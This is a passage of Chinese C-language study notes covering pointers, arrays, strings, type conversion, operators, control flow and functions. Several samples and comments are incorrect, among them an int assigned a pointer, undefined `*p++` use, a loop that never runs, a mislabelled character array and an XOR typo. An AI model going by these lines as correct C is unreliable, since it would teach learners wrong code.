class="code"><pre><span class="line"><span class="keyword">int</span> data = <span class="number">0x12345678</span>;</span><br><span class="line"><span class="keyword">char</span> *pc = &amp;data;  <span class="comment">// 赋值操作，丢失了类型</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,*pc)  <span class="comment">// 78</span></span><br></pre></td></tr></table></figure><h4 id="算术运算"><a class="markdownIt-Anchor" href="#算术运算"></a> 算术运算</h4><ul><li>指针的算术运算，不是简单的数值运算，而是一种数值加类型运算。将指针加上或者减去某个整数值（步长，以 <code>n*sizeof(T)</code>为单位进行操作的）。</li></ul><table><thead><tr><th>运算符</th><th>示 例</th></tr></thead><tbody><tr><td><code>+</code></td><td><code>p+5;</code></td></tr><tr><td><code>-</code></td><td><code>p-5;</code></td></tr><tr><td><code>++</code></td><td><code>p++/++p;</code></td></tr><tr><td><code>--</code></td><td><code>p--/--p;</code></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *p = (<span class="keyword">int</span>*)<span class="number">0x001</span>;</span><br><span class="line"><span class="keyword">int</span> pData = <span class="number">0x001</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d,%d&quot;</span>,p,p+<span class="number">1</span>);   <span class="comment">// 0x1,0x5</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d,%d&quot;</span>,pData,pData+<span class="number">1</span>); <span class="comment">// 0x1,0x2</span></span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">10</span>];<span class="keyword">int</span> *pHead = &amp;arr[<span class="number">0</span>];<span class="keyword">int</span> *pTail = &amp;arr[<span class="number">9</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,pHead-pTail);  <span class="comment">// -9 数组在连续空间保存的是指针，不是int</span></span><br></pre></td></tr></table></figure><h4 id="关系运算"><a class="markdownIt-Anchor" href="#关系运算"></a> 关系运算</h4><ul><li>比较的两个指针会判断指向的地址，不去校验指针类型。而c++不可以比较不同类型指针。</li></ul><table><thead><tr><th>运算符</th><th>示 例</th></tr></thead><tbody><tr><td><code>==</code></td><td><code>p1==p2</code></td></tr><tr><td><code>&gt;</code></td><td><code>p2 &gt; p2</code></td></tr><tr><td><code>&lt;</code></td><td><code>p1 &lt; p2</code></td></tr></tbody></table><h3 id="数组和指针"><a class="markdownIt-Anchor" href="#数组和指针"></a> 数组和指针</h3><h4 id="一维数组-2"><a class="markdownIt-Anchor" href="#一维数组-2"></a> 一维数组</h4><blockquote><ol><li>数组名是一个常量，不允许重新赋值</li><li>指针变量是一个变量，可以重新赋值</li><li><code>p+i</code> 和 <code>a+i</code> 均表示数组元素 <code>a[i]</code>的地址，均指向 <code>a[i]</code></li><li><code>*(p+i)</code>和*(a+i)均表示 <code>p+i</code> 和 <code>a+i</code> 所指对象的内容 <code>a[i]</code></li><li><code>*p++</code>：等价于<code>*(p++)</code>。其作用：先得到<code>*p</code>，再使 <code>p=p+1</code></li><li><code>(*p)++</code>:表示将<code>p</code>所指向的变量（元素）的值加1。即等价于<code>a[i]++</code></li><li>指向数组元素的指针也可以表示成数组的形式，即允许指针变量带下标，如<code>*(p+i)</code>可以表示成 <code>p[i]</code></li></ol></blockquote><ul><li>数组名是数组的唯一标识符，数组名代表数组首元素的地址，并且携带了类型信息。<code>arr==&amp;arr[0]</code>其中<code>int*</code>隐含在数组名中。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">10</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;array[%d] = %d\n&quot;</span>,i,<span class="built_in">array</span>[i]);   <span class="comment">// 下标访问数组</span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;array[%d] = %d\n&quot;</span>,i,*(<span class="built_in">array</span>+i));  <span class="comment">// 本质偏移法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><ul><li>数组除了可以用下标法和本质法访问以外，还可以用指针法访问。能用数组名解决的问题的，都可以用指针来解决，而能用指针来解决的问题，并一定能用数组名来解决。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//------访问方式一-------</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">10</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>&#125;; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;array = %p\n &amp;array[0] = %p\n&quot;</span>,<span class="built_in">array</span>,&amp;<span class="built_in">array</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//array 代表首元素地址，array[0]就是数组的首元素，类型是 int 类型，其地址类型就是 int *。故可将一维数组跟跟一级指针联系在一起。</span></span><br><span class="line"><span class="keyword">int</span> *p = <span class="built_in">array</span>;  <span class="comment">// 指针变量可以更改</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;array[%d] = %d\n&quot;</span>,i,<span class="comment">/*p[i]*/</span> *(p+i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//------访问方式二-------</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i&lt;<span class="number">10</span>; i++,p++)&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;array[%d] = %d\n&quot;</span>,i,*p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//------访问方式三-------</span></span><br><span class="line">*p = <span class="built_in">array</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;array[%d] = %d\n = %d\n&quot;</span>,i,*p++,*(p++));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二维数组-2"><a class="markdownIt-Anchor" href="#二维数组-2"></a> 二维数组</h4><ul><li>数组元素的表示方法是：数组名称<code>[行][列]</code>，对于<code>m</code>行<code>n</code>列的二维数组，<code>a[0][0]</code>是数组的第一个元素，<code>a[m-1][n-1]</code>是最后一个元素。</li><li>二维数组名解引用，降维为一维数组名。 <code>*(a+1) &lt;==&gt; a[1]</code></li><li>对一维数组名引用，升级为二维数组名。 <code>&amp;a[1] &lt;==&gt; (a+1)</code></li><li><code>&amp;</code>引用和<code>*</code>解引用互为逆向关系。</li><li>二维数组名的本质是，<font color="red"><strong>数组指针</strong></font>。</li></ul><blockquote><ol><li><code>a</code> 是数组首元素的地址，所以 a 的值和<code>&amp;a[0]</code>的值相同，另一方面，<code>a[0]</code>本身是包含 4 个整数的数组，因此，<code>a[0]</code>的值同其首元素的地址<code>&amp;a[0][0]</code>相同。简单的讲，<code>a[0]</code>是一个整数大小对象的地址，而 <code>a</code> 是 4 个整数大小对象的地址。因为整数和 4 个整数组成的数组开始于同一个地址，因此 <code>a</code> 和 <code>a[0]</code>的值是相同的。</li><li><code>a</code> 所指的对象大小是 4 个 <code>int</code>,而 <code>a[0]</code>所指的对象大小一个 int,因此，<code>a+1</code> 和<code>a[0]+1</code> 的结果是不同的。</li></ol></blockquote><h4 id="指针数组"><a class="markdownIt-Anchor" href="#指针数组"></a> 指针数组</h4><ul><li>一个数组中的各个元素都是字符指针，我们称该数组为字符指针数组，或是指针数组。</li><li>本质是数组，同时数组中的成员，均是指针。 通常意义上的指针数组，指的是字符指针数组。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> a, b, c, d;</span><br><span class="line"><span class="keyword">char</span>* pArr[<span class="number">4</span>] = &#123;&amp;a, &amp;b, &amp;c, &amp;d&#125;; <span class="comment">//字符指针数组</span></span><br><span class="line"><span class="keyword">char</span>* names[] = &#123;<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Pear&quot;</span>, <span class="string">&quot;Peach&quot;</span>, <span class="string">&quot;Banana&quot;</span>&#125;;<span class="comment">//字符指针数组，本质是一样的，都是保存的指针。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>;</span><br></pre></td></tr></table></figure><h2 id="字符串"><a class="markdownIt-Anchor" href="#字符串"></a> 字符串</h2><h3 id="引入"><a class="markdownIt-Anchor" href="#引入"></a> 引入</h3><ul><li>C 语言提供了字符串，但是没有提供字符串类型。字符串常量，是双引号括起的任意字符序列。c语言将字符串处理为一个指向<code>data段</code>的地址，包含了起始地址，步长，<code>\0</code>。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Hello World&quot;</span>; <span class="comment">//字符串常量</span></span><br><span class="line"><span class="keyword">char</span> *str = <span class="string">&quot;1234&quot;</span>; <span class="comment">//字符指针，字符串处理为一个指向data段的地址</span></span><br><span class="line"><span class="built_in">printf</span>( <span class="string">&quot;%d&quot;</span>,<span class="keyword">sizeof</span>(<span class="string">&quot;hello world&quot;</span>));<span class="comment">//大小是12</span></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-45.png" alt="字符串存储" /></p><ul><li>最后的字符<code>\0</code>,我们称为字符串结束字符，是系统对双引号引起的字符串自动加设的，而非手动干预。</li></ul><h3 id="字符串与字符数组"><a class="markdownIt-Anchor" href="#字符串与字符数组"></a> 字符串与字符数组</h3><ul><li>字符数组跟字符串某些方面是完全等价的。要实现等价，字符数组的大小要比字符串的大小要大。</li><li>一个没有<code>\0</code>结尾的字符串，不能称为一个合格的字符串。所以说，如果字符数组的大小比字符串的大小，要小。此时，字符串会被截断，拷贝到字符数组中去。此时字符串，和被拷贝到数组中的字符串之间不存在等价关系。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *str = <span class="string">&quot;1234&quot;</span>; <span class="comment">//字符指针，用于指向字符串常量，但不能更改</span></span><br><span class="line"><span class="keyword">char</span> str[] = <span class="string">&quot;1234&quot;</span>; <span class="comment">//字符指针数组，根据字符串大小开辟空间，两者等价</span></span><br></pre></td></tr></table></figure><h3 id="字符串输入与输出"><a class="markdownIt-Anchor" href="#字符串输入与输出"></a> 字符串输入与输出</h3><ul><li>输出<ul><li>printf：遇到字符串结束标记则会停止打印输出.<code>printf(&quot;%s\n&quot;,&quot;abcdefg&quot;);//常见第二个参数：char* /字符数组名/常量字符串</code></li><li>puts：<code>int puts(const char *_Str);//向屏幕输出，成功返回&gt;0，失败返-1，特点，自动追加换行。</code></li></ul></li><li>输入<ul><li>scanf：scanf 遇到空格会截止输入。但是要记得，不要输入的字符长度超过给定的空间大小。在不越界的情况下，scanf 会自动在字符串后面追加<code>\0</code>。<code>scanf(&quot;%s&quot;,name); //测试空格和越界 &quot;%[^\n]s&quot; -&gt;fgets()</code></li><li>gets：gets 直到遇到回车，才停止输入，空格也作为字符输入，但是要记得，不要输入的字符长度超过给定的空间大小。在不越界的情况下，gets 会自动在字符串后面追加<code>\0</code>。也存在越界风险。<code>gets(name); // 测试空格和越界</code></li><li>fgets：<code>fgets(arr,10,stdin);</code></li></ul></li></ul><h3 id="字符串操作函数"><a class="markdownIt-Anchor" href="#字符串操作函数"></a> 字符串操作函数</h3><table><thead><tr><th>函数</th><th>所在文件</th><th>说明</th></tr></thead><tbody><tr><td><code>size_t strlen ( const char * str );</code></td><td>string.h</td><td>获取长度</td></tr><tr><td><code>char * strcat ( char * dest, const char * src );</code></td><td>string.h</td><td>追加 src 串到 dest 的末尾，dest 的末尾的’\0’字符，会被 src 的第一个字符所覆盖，追加完成后的新串会被在其末尾自动追加’\0’。</td></tr><tr><td><code>char * strcpy ( char * dest, const char * src );</code></td><td>string.h</td><td>拷贝 src 所指向的字符串，到 dest 所指向空间中去，拷贝到 dest的内容包含 src 中的结束符’\0’。</td></tr><tr><td><code>int strcmp ( const char * str1, const char * str2 );</code></td><td>string.h</td><td>比较字符串 str1 和字符串 str2 的大小。该函数从两字符串的第一个字符开始，如果相等，依次往下比较，直到遇到不相同的字符或其中一个遇到’\0’s。比较的依据，是两字符对应的 ASCII 值的大小。</td></tr></tbody></table><h2 id="数据类型转化"><a class="markdownIt-Anchor" href="#数据类型转化"></a> 数据类型转化</h2><h3 id="隐式转化"><a class="markdownIt-Anchor" href="#隐式转化"></a> 隐式转化</h3><ul><li>不需要人为参与而产生的默认转称为隐式转化。</li><li>隐式转化规则：从小到大转<code>char short-&gt;int-&gt;long-&gt;longlong-&gt;float-&gt;double</code></li></ul><h4 id="算术转化"><a class="markdownIt-Anchor" href="#算术转化"></a> 算术转化</h4><ul><li>整形提升：char short int 等类型在一起运算时，首先提升到 int，这种现象叫作整型提升。整型提升的原更换是符号扩充。</li><li>混合提升：在进行运算时，以表达式中最长类型为主，将其他类型位据均转换成该类型，如：<ol><li>若运算中最大范围为 double，则转化为 double。(10<sup>308</sup>)</li><li>若运算中最大范围为 float 则转化为 float。（10<sup>38</sup>）</li><li>若运算中最大范围为 long long 则转化为 long long。（2<sup>64</sup>）</li><li>若运算中最大范围为 int 则转化为 int。(2<sup>32</sup>)</li><li>若运算中有 char short 则一并转化为 int。（2<sup>8</sup> / 2<sup>16</sup> / 2<sup>32</sup>）</li></ol></li></ul><h4 id="赋值转化"><a class="markdownIt-Anchor" href="#赋值转化"></a> 赋值转化</h4><ul><li>整型和实型之间是可以相互赋值的。赋值的原则是，一个是加零，一个是去小数位。</li></ul><h3 id="强制转化"><a class="markdownIt-Anchor" href="#强制转化"></a> 强制转化</h3><ul><li>隐式类型转化，是有缺陷的，当隐式类型转化不能满足我们的需求时，就需要强制类型转化。</li><li>格式：<code>（类型）待转表达式</code></li></ul><h1 id="运算符表达式位操作"><a class="markdownIt-Anchor" href="#运算符表达式位操作"></a> 运算符/表达式/位操作</h1><ul><li>要通过运算符就可以对常量与变量进行运算。</li><li>表达式是由操作数和运算符构成，操作数本身也可以是一个表达式。表达式再在其后加一个分号，即构成 C 语言语句。</li></ul><h2 id="运符符"><a class="markdownIt-Anchor" href="#运符符"></a> 运符符</h2><h3 id="cc语全部运算符"><a class="markdownIt-Anchor" href="#cc语全部运算符"></a> c/c++语全部运算符</h3><table><thead><tr><th>Precedence</th><th>Operator</th><th>Description</th><th>Associativity</th></tr></thead><tbody><tr><td>1</td><td>++ –</td><td>Suffix/postfix increment and decrement</td><td>Left-to-right</td></tr><tr><td></td><td>()</td><td>Function call and subexpression</td><td></td></tr><tr><td></td><td><code>[]</code></td><td>Array subscripting</td><td></td></tr><tr><td></td><td><code>.</code></td><td>Structure and union member access</td><td></td></tr><tr><td></td><td><code>-&gt;</code></td><td>Structure and union member access through pointer</td><td></td></tr><tr><td>2</td><td><code>++ --</code></td><td>Prefix increment and decrement</td><td>Right-to-left</td></tr><tr><td></td><td><code>+ -</code></td><td>Unary plus and minus</td><td></td></tr><tr><td></td><td><code>! ~</code></td><td>Logical NOT and bitwise NOT</td><td></td></tr><tr><td></td><td><code>(type)</code></td><td>Type cast</td><td></td></tr><tr><td></td><td><code>*</code></td><td>Indirection (dereference)</td><td></td></tr><tr><td></td><td><code>&amp;</code></td><td>Address-of</td><td></td></tr><tr><td></td><td><code>sizeof</code></td><td>Size-of</td><td></td></tr><tr><td>3</td><td><code>* / %</code></td><td>Multiplication, division, and remainder</td><td>Left-to-right</td></tr><tr><td>4</td><td><code>+ -</code></td><td>Addition and subtraction</td><td></td></tr><tr><td>5</td><td><code>&lt;&lt; &gt;&gt;</code></td><td>Bitwise left shift and right shift</td><td></td></tr><tr><td>6</td><td><code>&lt; &lt;=</code></td><td>For relational operators &lt; and ≤ respectively</td><td></td></tr><tr><td></td><td><code>&gt; &gt;=</code></td><td>For relational operators &gt; and ≥ respectively</td><td></td></tr><tr><td>7</td><td><code>== !=</code></td><td>For relational = and ≠ respectively</td><td></td></tr><tr><td>8</td><td><code>&amp;</code></td><td>Bitwise AND</td><td></td></tr><tr><td>9</td><td><code>^|</code></td><td>Bitwise XOR (exclusive or)</td><td></td></tr><tr><td>10</td><td><code>|</code></td><td>Bitwise OR (inclusive or)</td><td></td></tr><tr><td>11</td><td><code>&amp;&amp;</code></td><td>Logical AND</td><td></td></tr><tr><td>12</td><td><code>||</code></td><td>Logical OR</td><td></td></tr><tr><td>13</td><td><code>?:</code></td><td>Ternary conditional</td><td>Right-to-Left</td></tr><tr><td>14</td><td><code>=</code></td><td>Simple assignment</td><td></td></tr><tr><td></td><td><code>+= -=</code></td><td>Assignment by sum and difference</td><td></td></tr><tr><td></td><td><code>*= /= %=</code></td><td>Assignment by product, quotient, and remainder</td><td></td></tr><tr><td></td><td><code>&lt;&lt;= &gt;&gt;=</code></td><td>Assignment by bitwise left shift and right  shift</td><td></td></tr><tr><td></td><td><code>&amp;= ^= |=</code></td><td>Assignment by bitwise AND, XOR, and OR</td><td></td></tr><tr><td>15</td><td><code>,</code></td><td>Comma</td><td>Left-to-right</td></tr></tbody></table><h3 id="运符符分类"><a class="markdownIt-Anchor" href="#运符符分类"></a> 运符符分类</h3><ul><li>计算机中还按操作的数的个数将其分为 3 类，单目运算符，双目运算符和三目运算符。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a = <span class="number">4</span> + <span class="number">6</span>; <span class="comment">// 加号即为双目运算符。</span></span><br><span class="line">a++; <span class="comment">// 自加运算符，即为单目运算符。</span></span><br><span class="line">a&gt;b ? a:b; <span class="comment">// 条件表达式，就三个操作数，即为三目运算符，也是唯一的三目运算符</span></span><br></pre></td></tr></table></figure><h2 id="表达式"><a class="markdownIt-Anchor" href="#表达式"></a> 表达式</h2><ul><li>任何表达式是有返回值的：<code>a=b=5</code>，这里<code>b=5</code>的返回值赋值给了<code>a</code>。</li><li>使用常见运符算符就可以构成表达式。</li></ul><h2 id="位操作"><a class="markdownIt-Anchor" href="#位操作"></a> 位操作</h2><ul><li>位操作不同于逻辑操作，逻辑操作是一种整体的操作，而位操作是针对内部数据位补码的操作。逻辑操作的世界里，只有真与假（零和非零），而位操作的世界里按位论真假（1 和 0）。运算符也不同，如下。</li></ul><table><thead><tr><th>位运算符</th><th>逻辑运算符</th><th>说明</th></tr></thead><tbody><tr><td>&amp;</td><td>&amp;&amp;</td><td></td></tr><tr><td><code>|</code></td><td><code>||</code></td><td></td></tr><tr><td><code>~</code></td><td><code>！</code></td><td></td></tr><tr><td><code>^|</code></td><td></td><td></td></tr><tr><td><code>&lt;&lt; &gt;&gt;</code></td><td></td><td>位数为非负整数，且默认对 32 求余<br>对无符号数和有符号中的正数补 0；有符号数中的负数，取决于所使用的系统：补0的称为“逻辑右移”，补1的称为“算术右移”。</td></tr><tr><td><code>&amp;= |= ^= &gt;&gt;= &lt;&lt;=</code></td><td></td><td></td></tr></tbody></table><h1 id="程序流程"><a class="markdownIt-Anchor" href="#程序流程"></a> 程序流程</h1><h2 id="选择"><a class="markdownIt-Anchor" href="#选择"></a> 选择</h2><h3 id="if"><a class="markdownIt-Anchor" href="#if"></a> if</h3><ul><li><code>if</code>后面的大括号可以省略，但是只有<code>if</code>后的第一行隶属于<code>if</code>，其他即使缩进一样也不会在判断的语句中。<code>else</code>也是如此，而且必须和<code>if</code>共同使用。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(表达式) </span><br><span class="line">&#123;</span><br><span class="line"> 语句; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (表达式) </span><br><span class="line">&#123;</span><br><span class="line"> 语句; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> 语句; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="switch"><a class="markdownIt-Anchor" href="#switch"></a> switch</h3><ul><li>switch（表达式)，中的表达式，必须为整型和字符型。</li><li>case 只能为常量表达式。</li><li>case 分支是互斥的。</li><li>case 分支要同 break 连用，跳出 switch,不然匹配一次后，不再匹配。</li><li>两 case 块之间，可以用不大括号。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>（表达式) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> 常量 <span class="number">1</span>：</span><br><span class="line"> 代码块 <span class="number">1</span>；</span><br><span class="line"> <span class="keyword">break</span>；</span><br><span class="line"><span class="keyword">case</span> 常量 <span class="number">2</span> ：</span><br><span class="line"> 代码块 <span class="number">2</span>；</span><br><span class="line"> <span class="keyword">break</span>；</span><br><span class="line"><span class="keyword">case</span> 常量 <span class="number">3</span> ：</span><br><span class="line"><span class="keyword">default</span>：</span><br><span class="line"> 代码块 <span class="number">3</span>；</span><br><span class="line"> <span class="keyword">break</span>；<span class="comment">// 此处的 break 可以省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="循环"><a class="markdownIt-Anchor" href="#循环"></a> 循环</h2><ul><li>循环三要素:<ul><li>循环变量初始化</li><li>循环变量的变化（趋向终止条件）</li><li>循环终止条件</li></ul></li></ul><h3 id="while"><a class="markdownIt-Anchor" href="#while"></a> while</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i=<span class="number">10</span>; <span class="comment">//循环变量初始化</span></span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="number">0</span>)&#123; <span class="comment">//循环终止条件</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;xxxxxxxxxxxxx\n&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  i--; <span class="comment">//有使循环趋于结束的语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="do-while"><a class="markdownIt-Anchor" href="#do-while"></a> do while</h3><ul><li>先执行循环体中的语句，然后再判断条件是否为真，如果为真则继续循环；如果为假，则终止循环。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"> 语句;</span><br><span class="line">&#125; <span class="keyword">while</span> (表达式);</span><br></pre></td></tr></table></figure><h3 id="for"><a class="markdownIt-Anchor" href="#for"></a> for</h3><ul><li>计算表达式 1 的值，通常为循环变量赋初值。</li><li>计算表达式 2 的值，即判断循环条件是否为真，若值为真则执行循环体一次，否则跳出循环。</li><li>计算表达式 3 的值，这里通常写更新循环变量的赋值表达式，然后转回第 2步重复执行。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>( 表达式 <span class="number">1</span> ; 表达式 <span class="number">2</span> ; 表达式 <span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line"> 语句；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跳转"><a class="markdownIt-Anchor" href="#跳转"></a> 跳转</h2><h3 id="break"><a class="markdownIt-Anchor" href="#break"></a> break</h3><ul><li>提前结束当前循环，break 只能跳出一重循环</li></ul><h3 id="continue"><a class="markdownIt-Anchor" href="#continue"></a> continue</h3><ul><li>结束当前本轮循环，进入下一轮循环。</li></ul><h3 id="goto"><a class="markdownIt-Anchor" href="#goto"></a> goto</h3><ul><li>goto 会破坏结构化程序设计流程，它将使程序层次不清，且不易读，所以慎用。</li><li>goto 语句，仅能在本函数内实现跳转，不能实现跨函数跳转(短跳转)。但是他在跳出多重循环的时候效率还是蛮高的，再者就是集中错误处理。</li></ul><h3 id="return"><a class="markdownIt-Anchor" href="#return"></a> return</h3><ul><li>结束当前函数，返回调用。</li></ul><h1 id="函数"><a class="markdownIt-Anchor" href="#函数"></a> 函数</h1><ul><li>函数提高了代码的重用性，c中除了标准库的函数可以用外，我们还可以自定义函数。</li></ul><h2 id="c标准库"><a class="markdownIt-Anchor" href="#c标准库"></a> c标准库</h2><ul><li>由Ｃ语言系统提供；用户无须定义，也不必在程序中作类型说明；只需在程序前包含有该函数定义的头文件(/usr/include/stdio.h)，而不无关系库在哪里（/usr/lib/libc.so）;标准库到底提供了哪些函数可以通过查表的方式获得。</li></ul><h3 id="随机函数"><a class="markdownIt-Anchor" href="#随机函数"></a> 随机函数</h3><ul><li>使用随机函数产生，某一范围内了随机数。比如生成[1,100]以内的随机数。srand和 rand()配合使用产生伪随机数序列。rand 函数在产生随机数前，需要系统提供的生成伪随机数序列的种子，rand 根据这个种子的值产生一系列随机数。如果系统提供的种子没有变化，每次调用 rand 函数生成的伪随机数序列都是一样的。</li></ul><table><thead><tr><th>函数</th><th>所在文件</th><th>说明</th></tr></thead><tbody><tr><td><code>int rand (void);</code></td><td><code>stdlib.h</code></td><td>产生一组<code>[0,RAND_MAX]</code>伪随机数</td></tr><tr><td><code>void srand (unsigned int seed);</code></td><td><code>stdlib.h</code></td><td>设置随机种子seed</td></tr></tbody></table><ul><li>随机种子一般设置<code>srand(time(NULL));</code>，但是在同一秒得出的随机数可能仍然是相同的。</li></ul><h3 id="时间函数"><a class="markdownIt-Anchor" href="#时间函数"></a> 时间函数</h3><table><thead><tr><th>函数</th><th>所在文件</th><th>说明</th></tr></thead><tbody><tr><td><code>struct tm * localtime (const time_t * timer);</code></td><td><code>stdlib.h</code></td><td>获取时间函数，转换时间戳为time结构体</td></tr></tbody></table><ul><li>返回值详细解析：</li></ul><table><thead><tr><th>variable</th><th>Meaning</th><th>Range</th></tr></thead><tbody><tr><td>int tm_sec</td><td>seconds after the minute</td><td>0-61*</td></tr><tr><td>int tm_min</td><td>minutes after the hour</td><td>0-59</td></tr><tr><td>int tm_hour</td><td>hours since midnight</td><td>0-23</td></tr><tr><td>int tm_mday</td><td>day of the month</td><td>1-31</td></tr><tr><td>int tm_mon</td><td>months since January</td><td>0-11</td></tr><tr><td>int tm_year</td><td>years since 1900</td><td></td></tr><tr><td>int tm_wday</td><td>days since Sunday</td><td>0-6</td></tr><tr><td>int tm_yday</td><td>days since January 1</td><td>0-365</td></tr><tr><td>int tm_isdst</td><td>Daylight Saving Time flag</td><td></td></tr></tbody></table><h3 id="数学函数"><a class="markdownIt-Anchor" href="#数学函数"></a> 数学函数</h3><table><thead><tr><th>函数</th><th>所在文件</th><th>说明</th></tr></thead><tbody><tr><td><code>double sqrt(double x)</code></td><td>math.h</td><td>计算 x 的平方根（squareroot）</td></tr><tr><td><code>double pow(double x, double y)</code></td><td>math.h</td><td>计算 x 的 y 次幂(power)</td></tr><tr><td><code>double ceil(double x)</code></td><td>math.h</td><td>求不小于 x 的最小整数，并以 double 形式显示</td></tr><tr><td><code>double floor(double x)</code></td><td>math.h</td><td>求不大于 x 的最大整数，并以 double 形式显示</td></tr><tr><td><code>double sin(double x)</code></td><td>math.h</td><td>正弦曲线</td></tr></tbody></table><h3 id="工具函数"><a class="markdownIt-Anchor" href="#工具函数"></a> 工具函数</h3><table><thead><tr><th>函数</th><th>所在文件</th><th>说明</th></tr></thead><tbody><tr><td>int toupper(int x)</td><td>ctype.h</td><td>如果 x 为小写字母，则返回对应的大写字母</td></tr><tr><td>int tolower(int x)</td><td>ctype.h</td><td>如果 x 为大写字母，则返回对应的小写字母</td></tr></tbody></table><h2 id="自定义函数"><a class="markdownIt-Anchor" href="#自定义函数"></a> 自定义函数</h2><h3 id="定义自定义函数"><a class="markdownIt-Anchor" href="#定义自定义函数"></a> 定义自定义函数</h3><ul><li>语法格式:<code>返回值 函数名(参数)&#123;函数体&#125;</code></li><li>定义和声明<ul><li>定义在前，声明在后</li><li>定义在后，声明在前，此时需要前向声明</li></ul></li></ul><h3 id="参数"><a class="markdownIt-Anchor" href="#参数"></a> 参数</h3><h4 id="形参和实参"><a class="markdownIt-Anchor" href="#形参和实参"></a> 形参和实参</h4><ul><li>形参：在定义或声明函数中指定的形参，在未出现函数调用时，它们并不占内存中的存储单元。只有在发生函数调用时，形参才被分配内存单元。在调用结束后，形参所占的内存单元也被释放。在声明时形参名可以省略。</li><li>实参：实参可以是常量、变量或表达式，但要求它们有确定的值。在调用时将实参的值赋给形参。</li><li>当入参中没有参数，可以使用<code>void</code>表示无入参：<code>int myMax(void);</code>，通常可以省略。</li><li>没有返回值，返回值是<code>void</code>，此时不可以省略，否则编译器会默认返回<code>int</code>。</li></ul><h4 id="传值与传址"><a class="markdownIt-Anchor" href="#传值与传址"></a> 传值与传址</h4><ul><li>函数被调用之前，函数内所有变量尚未开辟空间，函数调用时才开辟，函数结束空间释放。<ul><li>传值：声明：<code>void func(int a);</code>，调用：<code>func(a);</code></li><li>传址：声明：<code>void func(int* a);</code>，调用：<code>func(&amp;a);</code></li></ul></li><li>传递一维数组<ul><li>数组的传递不可能通过拷贝的方式，基于效率的原因，传递时数组名仅充当于地址使用。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disArray</span><span class="params">(<span class="keyword">int</span> arr[])</span></span>; <span class="comment">//本质传递的是指针</span></span><br><span class="line"><span class="comment">//disArray(arr) == disArray(&amp;arr[0]) 